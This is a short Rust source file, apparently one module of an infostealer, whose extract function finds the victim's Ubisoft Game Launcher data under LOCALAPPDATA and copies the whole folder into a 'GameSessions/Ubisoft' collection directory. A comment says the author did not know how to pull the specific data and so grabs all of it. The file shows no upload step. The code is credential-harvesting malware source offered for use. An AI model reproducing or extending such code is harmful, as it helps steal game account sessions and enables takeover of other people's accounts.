use std::path::{Path, PathBuf};
use std::fs;

// idk how to extract the ubisoft, atp i will js grab whole data
pub fn extract(output_dir: &Path) -> usize {
    let local_app_data = match std::env::var("LOCALAPPDATA") {
        Ok(p) => PathBuf::from(p),
        Err(_) => return 0,
    };

    let ubi_path = local_app_data.join("Ubisoft Game Launcher");
    if !ubi_path.exists() {
        return 0;
    }

    let dest_dir = output_dir.join("GameSessions").join("Ubisoft");
    
    if c_dir_recursive(&ubi_path, &dest_dir).is_ok() {
        1
    } else {
        0
    }
}

fn c_dir_recursive(src: &Path, dst: &Path) -> std::io::Result<()> {
    if !dst.exists() {
        fs::create_dir_all(dst)?;
    }

    for entry in fs::read_dir(src)? {
        let entry = entry?;
        let ft = entry.file_type()?;
        let dest_path = dst.join(entry.file_name());

        if ft.is_dir() {
            c_dir_recursive(&entry.path(), &dest_path)?;
        } else {
            fs::copy(&entry.path(), &dest_path)?;
        }
    }
    Ok(())
}
